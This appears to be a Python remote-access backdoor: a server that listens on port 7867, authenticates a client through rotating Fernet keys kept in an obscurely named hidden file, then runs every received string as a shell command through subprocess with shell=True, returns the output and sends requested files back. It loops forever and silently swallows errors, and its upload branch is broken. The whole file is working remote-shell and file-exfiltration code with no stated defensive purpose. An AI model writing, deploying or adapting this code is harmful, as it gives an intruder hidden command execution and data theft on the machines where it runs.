from cryptography.fernet import Fernet
from hashlib import sha256
import subprocess,sys,os,socket

file_path_to_read_and_write = os.path.abspath(".0903e3ddsda334d3.dasd234342.;sfaf'afafaf[a]]fasd.one")
def create_socket(port_no):
    while True:
        try:
            host = socket.gethostbyname(socket.gethostname())
            s=socket.socket()
            s.bind((host, port_no))
            s.listen(2)
            return s
        except socket.error as msg:
            del s
            pass
        

def data_loader():
    arr = []
    file = open(file_path_to_read_and_write,"r")
    for i in file.readlines():
        i = i.replace("\n","")
        if i=="\n":
            pass
        else:
            arr.append(i)
    file.close()
    del file
    return arr[0],arr[1]

def literal_eval(array): 
   return array[1:][:-1].split(',')

def secure_acceptor(s):
    def validate_socket(conn, address,s):
        client_token = conn.recv(10000)
        previous_password,current_password = data_loader()
        print(previous_password,current_password)
        new_encrypter = Fernet(current_password.encode())
        prev_encrypter = Fernet(previous_password.encode())
        decrypted_msg = new_encrypter.decrypt(client_token).decode()
        if decrypted_msg == sha256(previous_password.encode()).hexdigest():
            conn.send(prev_encrypter.encrypt((sha256(current_password.encode()).hexdigest()).encode()))
            del new_encrypter,prev_encrypter
            return True
        else:
            conn.close()
            del s
            s = create_socket(7867)
            socket_accept(s)
            return False
        

    def socket_accept(s):
        while True:
            try:
                conn, address = s.accept()
                validataion_s = validate_socket(conn,address,s)
                if  validataion_s == True:
                    data_processing(conn,address,s)
                    break
                else:
                    pass
            except Exception as msg:
               print(msg)
               pass
    socket_accept(s)

def key_changer(previous_passwords,current_passwords):
    
            file=open(file_path_to_read_and_write,"w")
            file.write(previous_passwords)
            file.write("\n")
            file.write(current_passwords)
            file.close()
            del file


def data_processing(conn,address,s):
    previous_password,current_password = data_loader()

    def sender(conn,data):
        def cur_pass_pre_en():
                previous_password,current_password = data_loader()
                key = Fernet(previous_password)
                current_password = sha256(current_password.encode()).hexdigest()
                data = key.encrypt(current_password.encode())
                del key
                return data

        def new_pass_pre_en():
            previous_password,current_password = data_loader()
            key = Fernet(previous_password)
            new_key = Fernet.generate_key()
            data = key.encrypt(new_key)
            del key
            return data,new_key
        
        
        def sender_head(data):
            previous_password,current_password = data_loader()
            en_key,new_key = new_pass_pre_en()
            da_encry = Fernet(new_key)
            en_con = da_encry.encrypt(data.encode())
            sign = cur_pass_pre_en()
            new_key = new_key.decode()
            key_changer(current_password,new_key)
            data_cap = f"{sign.decode()},{en_key.decode()},{en_con.decode()}"
            data_cap_encrp = Fernet(current_password.encode())
            data_cap_en = data_cap_encrp.encrypt(data_cap.encode())
            conn.sendall(data_cap_encrp.encrypt(str(sys.getsizeof(str(data_cap_en))).encode()))
            del data_cap_encrp,da_encry
            conn.sendall(data_cap_en)
            
        sender_head(data)
    def receiver(conn):
        def receiver_head():
            data = conn.recv(50000)
            previous_password,current_password = data_loader()
            data_k = Fernet(current_password)
            data_length = int(data_k.decrypt(data).decode())
            return receiver_data(conn,data_length)
            del data_dec                
            
        def receiver_data(conn,data_length):
            data = str(conn.recv(data_length),"utf-8")
            previous_password,current_password = data_loader()
            new_encrypter = Fernet(current_password)
            data = new_encrypter.decrypt(data.encode()).decode()
            data = data.split(",")
            key = Fernet(previous_password)
            
            if key.decrypt(data[0].encode()).decode() == sha256(current_password.encode()).hexdigest():
                del new_encrypter,key
                keys = Fernet(previous_password)
                new_key = keys.decrypt(data[1].encode()).decode()
                del keys
                key_changer(current_password,new_key)
                data_dec = Fernet(new_key)
                datas = data_dec.decrypt(data[2].encode())
                del data_dec               
                return datas 
            else:
                conn.close()
                del s
                s = create_socket(7867)
                socket_accept(s)
        return receiver_head()
    def read_file(file_name):
        file = open(file_name,"rb")
        data = file.read()
        file.close()
        del file
        return data
    def write_file(file_name,data):
        file = open(file_name,"wb")
        file.write(data)
        file.close()
        del file
    while True:
        data = receiver(conn).decode()
        print("data ", data)
        if data == "filetransferfromus789789":
            print("file_transfer_from_us_initiated")
            file_name = receiver(conn)
            da_size = conn.recv(100000)
            previous_password,current_password = data_loader()
            frr = Fernet(current_password.encode())
            print(da_size)
            da_size = int(frr.decrypt(da_size).decode())
            datsa = conn.recv(da_size)
            print(datsa)
            frr.decrypt(datsa).decode()
            #print(frr.decrypt().decode())
            
            
            continue                
        if data == "filetransferfromu78349789":
            print("file_transfer_from_u_initiated")
            file_name = receiver(conn)
            print(file_name)
            arra = read_file(file_name)
            sender(conn, str(arra))
            continue
        if data[:2] == 'cd':
            os.chdir(data[3:])        

        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            currentWD = output_byte.decode() + os.getcwd() + "> "
            sender(conn,currentWD)

while True:
    try:
        s=create_socket(7867)
        secure_acceptor(s)
    except Exception as msg:
        pass
